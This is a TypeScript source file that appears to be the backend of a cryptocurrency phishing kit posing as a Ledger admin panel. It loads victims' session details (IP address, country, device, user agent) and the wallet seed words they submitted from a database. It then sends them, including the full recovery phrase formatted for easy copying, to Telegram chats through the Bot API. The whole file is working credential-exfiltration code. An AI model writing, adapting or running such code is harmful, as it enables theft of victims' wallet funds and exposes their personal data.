// deno-lint-ignore-file no-explicit-any
import { serviceClient } from "./session.ts";

function esc(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

type SendResult = { sent: number; failed: number; errors: string[] };

async function sendTelegramToActiveChats(text: string): Promise<SendResult> {
  const token = Deno.env.get("TELEGRAM_BOT_TOKEN");
  if (!token) return { sent: 0, failed: 0, errors: ["TELEGRAM_BOT_TOKEN missing"] };

  const supabase = serviceClient();
  const { data: chats } = await supabase
    .from("telegram_chat_ids")
    .select("chat_id, label")
    .eq("active", true);

  if (!chats || chats.length === 0) {
    return { sent: 0, failed: 0, errors: ["no active chats"] };
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const results = await Promise.allSettled(
    chats.map((c: any) =>
      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: c.chat_id, text, parse_mode: "HTML" }),
      }).then(async (r) => {
        if (!r.ok) throw new Error(`${c.chat_id}: ${r.status} ${await r.text()}`);
        return c.chat_id;
      }),
    ),
  );

  const sent = results.filter((r) => r.status === "fulfilled").length;
  const failed = results.length - sent;
  const errors = results
    .filter((r): r is PromiseRejectedResult => r.status === "rejected")
    .map((r) => String(r.reason));

  return { sent, failed, errors };
}

export async function sendTestMessage(): Promise<SendResult> {
  const text = [
    "<b>✅ Testnachricht</b>",
    "",
    "Dies ist eine Testnachricht vom Ledger-Admin-Panel.",
    `<i>${new Date().toISOString()}</i>`,
  ].join("\n");
  return await sendTelegramToActiveChats(text);
}

export async function sendSessionCreated(sessionId: string): Promise<SendResult> {
  const supabase = serviceClient();
  const { data: session } = await supabase
    .from("sessions")
    .select("*, panels(slug)")
    .eq("id", sessionId)
    .maybeSingle();

  if (!session) return { sent: 0, failed: 0, errors: ["session not found"] };

  const panelSlug = (session as any).panels?.slug ?? session.panel_slug ?? null;

  const lines: string[] = [];
  lines.push(`<b>🆕 Neue Session gestartet</b>`);
  lines.push("");
  lines.push(`<b>Device:</b> ${esc(session.device ?? "—")}`);
  lines.push(`<b>Panel:</b> ${esc(panelSlug ?? "—")}`);
  lines.push(`<b>IP:</b> ${esc(session.ip ?? "—")}${session.country ? ` (${esc(session.country)})` : ""}`);
  if (session.user_agent) {
    lines.push(`<b>UA:</b> <code>${esc(String(session.user_agent).slice(0, 140))}</code>`);
  }
  lines.push("");
  lines.push(`<b>Session:</b> <code>${esc(session.id)}</code>`);

  const result = await sendTelegramToActiveChats(lines.join("\n"));

  await supabase.from("session_events").insert({
    session_id: sessionId,
    event_type: "telegram_created_sent",
    payload: result,
  });

  return result;
}

export async function sendSeedNotification(sessionId: string): Promise<SendResult> {
  const supabase = serviceClient();

  const [{ data: session }, { data: words }] = await Promise.all([
    supabase.from("sessions").select("*, panels(slug)").eq("id", sessionId).maybeSingle(),
    supabase.from("session_seed_words").select("*").eq("session_id", sessionId).order("position"),
  ]);

  if (!session) return { sent: 0, failed: 0, errors: ["session not found"] };

  const panelSlug = (session as any).panels?.slug ?? session.panel_slug ?? null;
  const sortedWords = (words ?? []).slice().sort((a: any, b: any) => a.position - b.position);
  const seedLine = sortedWords.map((w: any) => w.word).join(" ");

  const lines: string[] = [];
  lines.push(`<b>🔔 Seed eingereicht</b>`);
  lines.push("");
  lines.push(`<b>Device:</b> ${esc(session.device ?? "—")}`);
  lines.push(`<b>Panel:</b> ${esc(panelSlug ?? "—")}`);
  lines.push(`<b>IP:</b> ${esc(session.ip ?? "—")}${session.country ? ` (${esc(session.country)})` : ""}`);
  lines.push(`<b>Länge:</b> ${session.seed_length ?? sortedWords.length}`);
  lines.push("");
  lines.push(`<b>Seed (zum Kopieren tippen):</b>`);
  lines.push(`<code>${esc(seedLine)}</code>`);
  lines.push("");
  lines.push(`<b>Session:</b> <code>${esc(session.id)}</code>`);

  const result = await sendTelegramToActiveChats(lines.join("\n"));

  await supabase.from("session_events").insert({
    session_id: sessionId,
    event_type: "telegram_sent",
    payload: result,
  });

  return result;
}

// Backwards-compat alias
export const sendTelegramForSession = sendSeedNotification;
